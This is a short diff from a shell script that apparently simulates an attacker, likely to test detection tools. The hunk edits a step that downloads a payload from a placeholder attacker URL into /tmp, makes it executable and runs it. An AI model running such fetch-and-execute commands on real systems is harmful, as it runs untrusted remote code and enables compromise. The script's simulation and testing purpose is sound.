@@ -22,7 +22,7 @@ echo "[*] Simulated attacker endpoint: ${ATTACKER_IP}"
 #          Suspicious Directory
 # ----------------------------------------------------------------------------
 echo "[1/7] Download + execute payload in /tmp"
-curl -s -m 10 -o /tmp/demo-x.sh "${PAYLOAD_URL}" || wget -q -T 10 -O /tmp/demo-x.sh "${PAYLOAD_URL}" || echo "(attacker unreachable - simulated)"
+curl -s -m 10 -o /tmp/demo-x.sh "${PAYLOAD_URL}" 2>/dev/null || echo "(attacker unreachable - simulated)"
 chmod +x /tmp/demo-x.sh 2>/dev/null || true
 /tmp/demo-x.sh 2>/dev/null || true
 
